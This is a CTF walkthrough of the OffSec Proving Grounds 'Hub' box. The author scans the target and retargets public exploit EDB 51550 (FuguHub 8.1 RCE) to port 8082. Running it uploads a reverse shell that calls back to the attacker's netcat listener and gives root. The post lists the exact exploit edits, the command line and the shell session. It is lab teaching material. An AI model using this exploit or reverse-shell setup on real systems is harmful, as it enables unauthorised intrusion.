---
title: "Hub (OffSec PG) — Walkthrough: FuguHub 8.1 RCE to Instant Root"
description: "OffSec Proving Grounds Hub walkthrough — retargeting the FuguHub 8.1 RCE exploit (EDB 51550) from its default HTTPS/443 config to port 8082, landing a root shell with no privesc."
date: 2026-08-01 10:00:00 +0000
categories: [CTF]
tags: [ctf, offsec, proving-grounds, linux, web, rce, fuguhub, barracuda]
difficulty: Easy
---

> **Box:** OffSec Proving Grounds — Hub · **OS:** Linux (Debian) · **Theme:** FuguHub 8.1 RCE → instant root

Rooted this through the **FuguHub 8.1 RCE** (EDB `51550`) running on port `8082`. The catch was the public exploit ships pointed at HTTPS/443 with a `/cmsdocs` path, so I had to retarget it at this box before it worked — then it dropped a root shell. Port 80 was a rabbit hole.

- **Box:** `192.168.111.25`
- **Me:** `192.168.45.210`

---

## Recon

rustscan into nmap as usual:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ rustscan -a 192.168.111.25 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 192.168.111.25:22
Open 192.168.111.25:80
Open 192.168.111.25:8082
Open 192.168.111.25:9999
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 192.168.111.25

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open  http       syn-ack ttl 61 Barracuda Embedded Web Server
|_http-title: Home
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND PATCH POST PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_  Server Type: BarracudaServer.com (Posix)
|_http-server-header: BarracudaServer.com (Posix)
9999/tcp open  ssl/abyss? syn-ack ttl 61
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Issuer: commonName=Real Time Logic Root CA/organizationName=Real Time Logic LLC/...SharkSSL
|_  (cert PEM trimmed)

Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports: SSH (22), HTTP (80 → nginx 403), HTTP (8082 → Barracuda Embedded Web Server), SSL (9999).

Two things point straight at **FuguHub**: the Barracuda server on 8082 (FuguHub is built on BarracudaServer) and the SSL cert on 9999 with `commonName=FuguHub`. That's the target.

---

## Enumeration

### Port 80

nginx returning `403 Forbidden`. Ran directory brute-forcing and got nowhere — rabbit hole. Dropped it and focused on 8082.

### FuguHub (8082)

The Barracuda Embedded Web Server on 8082 is FuguHub's interface. Checked searchsploit:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec]
└─$ searchsploit FuguHub
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
FuguHub 8.1 - Remote Code Execution                    | multiple/webapps/51550.py
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**FuguHub 8.1 - Remote Code Execution** → `multiple/webapps/51550.py`. Matches the version fingerprint.

---

## Exploitation

The exploit as shipped assumes HTTPS on 443 with a `/cmsdocs` path — neither matched this box. Three edits to `51550.py` fixed it:

- `443` → `8082`
- `https://` → `http://`
- removed `/cmsdocs` from the exploit path

Then ran it with my listener details:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Hub]
└─$ python3 51550.py -r 192.168.111.25 -rp 8082 -l 192.168.45.210 -p 4444
[*] Checking for admin user...
[+] An admin user does exist..
[+] Logging in...
[+] Success! Finding a valid file server link...
[+] Code: 200, found valid file server, uploading rev shell
[+] Successfully uploaded, calling shell
```

The exploit confirmed an admin user existed, logged in, located a writable file-server endpoint, uploaded the reverse shell, and triggered it. Caught it on my listener:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Hub]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.111.25] 51352
ls
applications
bd.dat
bdd.conf
cache
cmsdocs
data
disk
drvcnstr.dat
FuguHub
FuguHub.lua
FuguHub.zip
InstallDaemon
LICENSE.txt
readme.txt
roles.dat
themes
trace
tuncnstr.dat
user.dat
```

Landed in the FuguHub directory. Went for the flag:

```bash
find / -name "proof.txt" 2>/dev/null
/root/proof.txt
cat /root/proof.txt
6cb1f9cff9aeeb64d8468b5f684dd3b1
```

`proof.txt` was in `/root` — FuguHub runs as root, so the RCE hands over a root shell with no separate privesc.

**proof.txt:** `6cb1f9cff9aeeb64d8468b5f684dd3b1`

---

## TL;DR

- rustscan/nmap → FuguHub on 8082 (Barracuda server) + FuguHub SSL cert on 9999
- Port 80 (nginx 403) = rabbit hole
- **FuguHub 8.1 RCE** (EDB `51550`) — retargeted: `443`→`8082`, `https`→`http`, dropped `/cmsdocs`
- Exploit logs in as admin → uploads reverse shell → root shell, `proof.txt` in `/root`
